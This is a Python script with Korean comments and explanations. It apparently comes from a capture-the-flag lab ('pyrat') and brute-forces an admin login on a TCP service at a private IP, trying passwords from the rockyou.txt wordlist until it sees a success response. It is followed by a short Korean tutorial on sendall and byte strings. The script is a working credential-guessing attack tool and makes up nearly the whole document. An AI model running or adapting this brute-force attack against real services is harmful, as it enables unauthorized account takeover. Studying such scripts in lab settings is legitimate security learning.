```python
import socket
import time

# 대상 서버 정보와 패스워드 리스트 경로
pyrat_IP = "10.10.247.143"
pyrat_PORT = 8000
wordlist = "/usr/share/wordlists/rockyou.txt"

def send_socket(ip: str, port: int, password: str) -> bool:
    try:
        # TCP 소켓 생성 및 서버 연결
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)  # 연결 타임아웃 5초
        s.connect((ip, port))
        # b -> 바이트로 변환 -> 소켓 통신 시 무조건 바이트로 전송해야 함
        s.sendall(b'admin\n')  # 사용자명(admin) 전송

        resp = s.recv(1024).decode(errors="ignore")  # 서버 응답 받기

        # 패스워드 입력 프롬프트 확인
        if "Password:" in resp:
            s.sendall(password.encode() + b"\n")  # 패스워드 전송 -> decode 바이트로 변환  -> 소켓 통신 시 무조건 바이트로 전송해야 함
            resp = s.recv(1024).decode(errors="ignore")  # 응답 받기

            # 로그인 성공/실패 판별
            if "success" in resp.lower() or "admin" in resp.lower():
                print(f"[+] Found! admin:{password} -> {resp.strip()}")  # 성공 시 출력
                return True
            else:
                print(f"[-] Failed: {password}")  # 실패 시 출력
    except Exception as e:
        # 연결 오류 발생 시 출력
        print(f"[!] Connection error for password '{password}': {e}")
    finally:
        # 소켓 자원 정리
        s.close()
    return False  # 실패 시 False 반환

def brut_pass():
    # 패스워드 리스트 파일을 한 줄씩 읽어서 시도
    with open(wordlist, "r", encoding="latin-1", errors="ignore") as file:
        for line in file:
            password = line.strip()  # 개행 제거
            if send_socket(pyrat_IP, pyrat_PORT, password):
                break  # 성공하면 반복 중단
            time.sleep(0.1)  # 서버 과부하 방지

if __name__ == "__main__":
    # 직접 실행 시 brut_pass 함수 호출
    brut_pass()
```

`sendall`은 소켓을 통해 데이터를 한 번에 모두 전송하는 함수입니다.  
여기서는 서버에 사용자명(`admin\n`)이나 패스워드(`password.encode() + b"\n"`)를 보낼 때 사용합니다.

- `s.sendall(b'admin\n')` → 서버에 "admin"이라는 문자열을 전송
- `s.sendall(password.encode() + b"\n")` → 서버에 패스워드 문자열을 전송

`sendall`은 데이터가 다 전송될 때까지 반복해서 보내주기 때문에, 네트워크 환경이 불안정해도 안전하게 쓸 수 있습니다.  
실제로 서버에 명령이나 인증 정보를 보낼 때 가장 많이 쓰는 방식입니다.

`b`는 파이썬에서 "바이트(byte) 문자열"을 의미합니다.

예를 들어, `b'admin\n'`은 일반 문자열이 아니라 컴퓨터가 네트워크로 바로 보낼 수 있는 바이트 데이터입니다.  
소켓 통신에서는 반드시 바이트 타입으로 데이터를 보내야 하므로,  
`'admin\n'` 앞에 `b`를 붙여서 바이트로 만들어 전송하는 겁니다.

정리하면:

- `b'admin\n'` → 바이트 타입, 소켓에 바로 전송 가능
- `'admin\n'` → 일반 문자열, 소켓에 직접 전송 불가

패스워드도 마찬가지로,  
`password.encode()`를 쓰면 문자열을 바이트로 변환해서 보낼 수 있습니다.
